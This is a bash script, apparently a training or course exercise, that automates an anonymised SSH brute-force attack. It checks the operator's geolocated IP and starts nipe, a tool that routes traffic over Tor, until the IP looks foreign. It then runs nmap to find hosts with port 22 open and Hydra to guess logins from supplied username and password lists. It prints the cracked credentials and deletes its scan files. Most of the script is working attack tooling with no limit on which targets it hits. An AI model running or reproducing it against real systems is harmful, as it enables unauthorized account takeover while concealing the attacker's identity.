#!/bin/bash

#~ curl -s ifconfig.me
#~ curl https://freegeoip.app/xml/

#~ anonymous checker
#~ 1.	Scans for SSH
#~ 2.	Print the number of found devices
#~ 3.	Add list, username, and password
#~ 4.	Display the success attempts

#get country from user
function user_country {
		A_CHECKER=0 #counter variable for while loop in this function 
		while [ "$A_CHECKER" -eq 0 ]
		do
			echo -e "\n[*]Which country are you using the device in?"
			echo "[*]Example: SG (Singapore), IL (Israel) or (Q)uit?"
			read -p "[?]Enter the country code: " COUNTRY_CODE
			IP_ME=$(curl -s ifconfig.me)
			COUNTRY_ME=$(curl -s https://freegeoip.app/xml/$IP_ME | grep CountryCode | sed 's/[<>]/ /g' | awk '{print $2}')
			
			case $COUNTRY_CODE in 
				SG | sg | Singapore | SINGAPORE | singapore )
				echo -e "You have entered the coutry as \e[1;31mSingapore\e[0m." 
				COUNTRY_USER_INPUT="SG"
				A_CHECKER=1
				shift
				;;
				IL | il | Israel | ISRAEL | israel )
				echo "You have entered the country as \e[1;31mIsrael\e[0m." 
				COUNTRY_USER_INPUT="IL"
				A_CHECKER=1
				shift
				;;
				q | Q | quit | Quit | QUIT )
				echo -e "\n[!]Exiting program."
				shift
				exit 1
				;;
				* )
				echo -e "\n[!]Unknow country entered."
				echo "[Note]Database only has SG (Singapore) and IL (Israel) for demostrating purposes."
				;;
			esac
		done			
}

#check if anonymous
function anon_check {
	IP_ME=$(curl -s ifconfig.me)
	COUNTRY_ME=$(curl -s https://freegeoip.app/xml/$IP_ME | grep CountryCode | sed 's/[<>]/ /g' | awk '{print $2}')
	if [ "$COUNTRY_USER_INPUT" == "$COUNTRY_ME" ]; then
		echo -e "\n[!] You are \e[1;31mNOT anonymous\e[0m!"
		echo -e "[!]IP: $IP_ME COUNTRY: \e[1;31m$COUNTRY_ME\e[0m"
		ANON_STATUS=1 #Not anonympus
	else
		echo -e "\n[*]Great! You are \e[1;31mANONYMOUS\e[0m!"
		echo -e "[*]IP: $IP_ME COUNTRY: \e[1;31m$COUNTRY_ME\e[0m"
		ANON_STATUS=0 #Anonymous
	fi			
}

#check nipe status
function nipe_status {
	echo -e "\n[*]Performing nipe status check..."
	sudo updatedb
	PATH_L=$(locate nipe.pl | sed 's/nipe.pl//g')
	cd $PATH_L ; sudo perl nipe.pl status > $NIPE_STATUS_FILE; cd ~-
	echo "[*]The file $NIPE_STATUS_FILE has been generated in $PATH_L"
}

#remove nipe status file
function remove_nipe_status_file {
	sudo updatedb
	PATH_L=$(locate nipe.pl | sed 's/nipe.pl//g')
	cd $PATH_L
	if [ -f "$NIPE_STATUS_FILE" ]; then
		rm $NIPE_STATUS_FILE
		echo "[*]Temporary file $NIPE_STATUS_FILE removed."
	fi
	cd ~-
}

#nipe start
NIPE_STATUS_FILE="nipe.status"
NIPE_START_CHECKER=0
function nipe_start {
	echo -e "\n[*]Starting nipe..."
	sudo updatedb
	PATH_L=$(locate nipe.pl | sed 's/nipe.pl//g')
	cd $PATH_L ; sudo perl nipe.pl start ; cd ~-
	#validate nipe status
	while [ "$NIPE_START_CHECKER" -eq 0 ]
	do
		nipe_status
		sudo updatedb
		NIPE_STATUS_FILE_L=$(locate $NIPE_STATUS_FILE)
		N_START_STATUS=$(cat $NIPE_STATUS_FILE_L | grep Status | sed 's/\.//g' | awk '{print $NF}')
		#validate if nipe is actived, if not then nipe restart
		if [ "$N_START_STATUS" == "activated" ]; then
			anon_check
			NIPE_START_CHECKER=1
		else
			nipe_restart
		fi
	done	
}

#ask if user want to execute nipe stop
function user_nipe_stop {
	NIPE_CHOICE_CHECKER=0
	echo
	while [ "$NIPE_CHOICE_CHECKER" -eq 0 ]
	do
		read -p "Proceed to disable nipe? (Y/n) " NIPE_CHOICE
		case $NIPE_CHOICE in
			y | Y | yes | Yes | YES )
			NIPE_CHOICE_CHECKER=1
			shift
			;;
			n | N | no | No | NO )
			NIPE_CHOICE_CHECKER=2
			shift 
			;;
			* )
			echo -e "[!]Please enter 'Y' or 'N' only."
			;;
		esac 
	done
	
}

#nipe stop
NIPE_STOP_CHECKER=0
function nipe_stop {
	echo -e "\n[*]Stopping nipe..."
	sudo updatedb
	PATH_L=$(locate nipe.pl | sed 's/nipe.pl//g')
	cd $PATH_L ; sudo perl nipe.pl stop ; cd ~-
	#~ #validate nipe status
	while [ "$NIPE_STOP_CHECKER" -eq 0 ]
	do
		nipe_status
		sudo updatedb
		NIPE_STATUS_FILE_L=$(locate $NIPE_STATUS_FILE)
		N_STOP_STATUS=$(cat $NIPE_STATUS_FILE_L | grep Status | sed 's/\.//g' | awk '{print $NF}')
		#validate if nipe is actived, if not then nipe restart
		if [ "$N_STOP_STATUS" == "disabled" ]; then
			anon_check
			NIPE_STOP_CHECKER=1
		else
			nipe_stop
		fi
	done	
}

#nipe restart
function nipe_restart {
	echo -e "\n[*]Restarting nipe..."
	sudo updatedb
	PATH_L=$(locate nipe.pl | sed 's/nipe.pl//g')
	cd $PATH_L ; sudo perl nipe.pl restart ; cd ~-
}

#get target username from user
function user_bf_name {
	BF_NAME_CHECKER=0
	while [ "$BF_NAME_CHECKER" -eq 0 ]
	do
		echo
		read -p "[?]Input of a single login username or load from a file? (s/f): " BF_NAME_TYPE
		case $BF_NAME_TYPE in
		s | S )
		read -p "[?]Enter the login username: " N_SINGLE
		BF_NAME_CHECKER=1
		shift
		;;
		f | F )
		N_FILE_CHECKER=0
		while [ "$N_FILE_CHECKER" -eq 0 ]
		do
			read -p "[?]Enter the filename of the list of login usernames: " N_FILE
			if [ -f "$N_FILE" ]; then
				N_FILE_CHECKER=1
				BF_NAME_CHECKER=2
			else
				echo -e "[!]The file $N_FILE does not exist. Please try again.\n"
			fi
		done
		shift
		;;
		* )
		echo "[!]Enter only 's' or 'f'. Please try again."
		esac
	done
}

#get passwword for target from user
function user_bf_pw {
	BF_PW_CHECKER=0
	while [ "$BF_PW_CHECKER" -eq 0 ]
	do
		echo
		read -p "[?]Input the a single password or load from a file? (s/f): " BF_PW_TYPE
		
		case $BF_PW_TYPE in
			s | S )
			read -p "[?]Enter the password: " PW_SINGLE
			BF_PW_CHECKER=1
			shift
			;;
			f | F )
			PW_FILE_CHECKER=0
			while [ "$PW_FILE_CHECKER" -eq 0 ]
			do
				read -p "[?]Enter the filename of the list of passwords: " PW_FILE
				if [ -f "$PW_FILE" ]; then
					PW_FILE_CHECKER=1
					BF_PW_CHECKER=2
				else
					echo -e "[!]The file $PW_FILE does not exist. Please try again.\n"
				fi
			done
			shift
			;;
			* )
			echo "[!]Enter only 's' or 'f'. Please try again."
		esac
	done
}

#get target ip from user
function user_bf_ip {
	BF_IP_CHECKER=0
	while [ "$BF_IP_CHECKER" -eq 0 ]
	do
		echo
		read -p "[?]Input the a single IP address or load from a file? (s/f): " BF_IP_TYPE
		
		case $BF_IP_TYPE in
			s | S )
			read -p "[?]Enter the IP address: " IP_SINGLE
			BF_IP_CHECKER=1
			shift
			;;
			f | F )
			IP_FILE_CHECKER=0
			while [ "$IP_FILE_CHECKER" -eq 0 ]
			do
				read -p "[?]Enter the filename of the list of IP addresses: " IP_FILE
				if [ -f "$IP_FILE" ]; then
					IP_FILE_CHECKER=1
					BF_IP_CHECKER=2
				else
					echo -e "[!]The file $IP_FILE does not exist. Please try again.\n"
				fi
			done
			shift
			;;
			* )
			echo "[!]Enter only 's' or 'f'. Please try again."
		esac
	done
}

#execute nmap
NMAP_SINGLE_IP="single_scan.og"
NMAP_FILE_IP="file_scan.og"
NMAP_PORT_O="nmap_ip_port.open"
function nmap_scan {
	if [ "$BF_IP_CHECKER" -eq 1 ]; then
		echo -e "\n[*]Scanning $IP_SINGLE for open port 22..."
		nmap $IP_SINGLE -p 22 --open -oG  $NMAP_SINGLE_IP >/dev/null
		NMAP_OPEN=$(cat $NMAP_SINGLE_IP | grep -v "^#" | grep open | awk '{print $2}')
		if [ ! -z "$NMAP_OPEN" ]; then
			echo $NMAP_OPEN > $NMAP_PORT_O
		fi
	elif [ "$BF_IP_CHECKER" -eq 2 ]; then
		IP_FILE_RECORD=$(cat $IP_FILE | wc -l)
		echo -e "\n[*]Scanning the file $IP_FILE with $IP_FILE_RECORD IP address(es) for open port 22..."
		nmap -iL $IP_FILE -p 22 --open -oG  $NMAP_FILE_IP >/dev/null
		NMAP_OPEN=$(cat $NMAP_FILE_IP | grep -v "^#" | grep open | awk '{print $2}')
		if [ ! -z "$NMAP_OPEN" ]; then
			$(echo "$NMAP_OPEN" > $NMAP_PORT_O)
		fi
	fi
	
	if [ -f "$NMAP_PORT_O" ]; then
		OPEN_PORT_RECORD=$(cat $NMAP_PORT_O | wc -l)
		echo -e "[*]Nmap scanning completed. Found \e[1;31m$OPEN_PORT_RECORD\e[0m IP record(s) with open ports."
	else
		echo "[!]Nmap did not find any open ports."
	fi
	
}

#execute hydra
HYDRA_RESULT="hydra.result"
function hydra_bf {
	#single login username: N_SINGLE and BF_NAME_CHECKER=1
	#single password: PW_SINGLE and BF_PW_CHECKER=1
	if [ "$BF_NAME_CHECKER" -eq 1 ] && [ "$BF_PW_CHECKER" -eq 1 ]; then
		if [ -f "$NMAP_PORT_O" ]; then
			echo -e "\n[*]Executing Hydra brute-force attack..."
			while read ip_line
			do
				hydra $ip_line -l $N_SINGLE -p $PW_SINGLE ssh -o $HYDRA_RESULT -t 4 >/dev/null
			done < $NMAP_PORT_O
			echo "[*]Finished executing Hydra."
		else
			echo "[!]Brute-force attack was not successful."
			exit 1
		fi
	fi
	
	#single login username: N_SINGLE and BF_NAME_CHECKER=1
	#file list password: PW_FILE and BF_PW_CHECKER=2
	if [ "$BF_NAME_CHECKER" -eq 1 ] && [ "$BF_PW_CHECKER" -eq 2 ]; then
		if [ -f "$NMAP_PORT_O" ]; then
			if [ -f "$PW_FILE" ]; then
				echo -e "\n[*]Executing Hydra brute-force attack..."
				while read ip_line
				do
					hydra $ip_line -l $N_SINGLE -P $PW_FILE ssh -o $HYDRA_RESULT -t 4 >/dev/null
				done < $NMAP_PORT_O
				echo "[*]Finished executing Hydra."
			else
				echo "[!]The file $N_FILE does not exist. Please try again."
				exit 1
			fi
		else
			echo "[!]Brute-force attack was not successful."
			exit 1
		fi
	fi
	
	#file list username: N_FILE and BF_NAME_CHECKER=2
	#single password: PW_SINGLE and BF_PW_CHECKER=1
	if [ "$BF_NAME_CHECKER" -eq 2 ] && [ "$BF_PW_CHECKER" -eq 1 ]; then
		if [ -f "$NMAP_PORT_O" ]; then
			if [ -f "$N_FILE" ]; then
				echo -e "\n[*]Executing Hydra brute-force attack..."
				while read ip_line
				do
					hydra $ip_line -L $N_FILE -p $PW_SINGLE ssh -o $HYDRA_RESULT -t 4 >/dev/null
				done < $NMAP_PORT_O
				echo "[*]Finished executing Hydra."
			else
				echo "[!]The file $N_FILE does not exist. Please try again."
				exit 1
			fi
		else
			echo "[!]Brute-force attack was not successful."
			exit 1
		fi
	fi
	
	#file list username: N_FILE and BF_NAME_CHECKER=2
	#file list password: PW_FILE and BF_PW_CHECKER=2
	if [ "$BF_NAME_CHECKER" -eq 2 ] && [ "$BF_PW_CHECKER" -eq 2 ]; then
		if [ -f "$NMAP_PORT_O" ]; then
			if [ -f "$N_FILE" ]; then
				if [ -f "$PW_FILE" ]; then
					echo -e "\n[*]Executing Hydra brute-force attack..."
					while read ip_line
					do
						hydra $ip_line -L $N_FILE -P $PW_FILE ssh -o $HYDRA_RESULT -t 4 >/dev/null
					done < $NMAP_PORT_O
					echo "[*]Finished executing Hydra."
				else 
					echo "[!]The file $PW_FILE does not exist. Please try again."
					exit 1
				fi
			else
				echo "[!]The file $N_FILE does not exist. Please try again."
				exit 1
			fi
		else
			echo "[!]Brute-force attack was not successful."
			exit 1
		fi
	fi
}

#output hydra result
function hydra_output {
	if [ -f "$HYDRA_RESULT" ]; then
		echo -e "\n\e[1;31m[!]Target(s) successfuly completed!\e[0m"
		cat $HYDRA_RESULT | grep -v "^#" | sort | uniq 
	else
		echo -e "\n[!]Brute-force attack was not successful. No Targets found!"
		exit 1
	fi 
}

#remove files used by the program



function files_remove {
	#NMAP_SINGLE_IP="single_scan.og"
	echo
	if [ -f "$NMAP_SINGLE_IP" ]; then
		rm $NMAP_SINGLE_IP
		echo "[*]Temporay file $NMAP_SINGLE_IP removed."
	fi
	#NMAP_FILE_IP="file_scan.og"
	if [ -f "$NMAP_FILE_IP" ]; then
		rm $NMAP_FILE_IP
		echo "[*]Temporay file $NMAP_FILE_IP removed."
	fi
	#NMAP_PORT_O="nmap_ip_port.open"
	if [ -f "$NMAP_PORT_O" ]; then
		rm $NMAP_PORT_O
		echo "[*]Temporay file $NMAP_PORT_O removed."
	fi
}

#ask if user wants to remove hydra output file $HYDRA_RESULT
function file_remove_hydra {
	CHECK_RM_HR=0
	if [ -f "$HYDRA_RESULT" ]; then
		while [ "$CHECK_RM_HR" -eq 0 ]
		do
			echo
			read -p "[?]Do you want to remove the file $HYDRA_RESULT? (Y/n) " RM_HR_F
			case $RM_HR_F in
			y | Y | yes | Yes | YES )
				rm $HYDRA_RESULT
				echo -e "[*]The file $HYDRA_RESULT has been removed."
				CHECK_RM_HR=1
			shift
			;;
			n | N | no | No | NO )
			if [ -f "$HYDRA_RESULT" ]; then
				echo -e "[*]The file $HYDRA_RESULT has been saved."
				CHECK_RM_HR=1
			fi
			shift
			;;
			* )
			echo -e "[!]Please enter 'Y' or 'N' only."
			;;
			esac
		done
	fi
}

user_country
anon_check

#if NOT anonymous, activate nipe
if [ "$ANON_STATUS" -eq 1 ]; then
	nipe_start
fi


#if anonymous, start BF
if [ "$ANON_STATUS" -eq 0 ]; then
	user_bf_name
	user_bf_pw
	user_bf_ip
	nmap_scan
	hydra_bf
	hydra_output
	files_remove
	file_remove_hydra
	user_nipe_stop
	if [ "$NIPE_CHOICE_CHECKER" -eq 1 ]; then
		nipe_stop
	elif [ "$NIPE_CHOICE_CHECKER" -eq 2 ]; then
		anon_check
	fi
	remove_nipe_status_file
fi


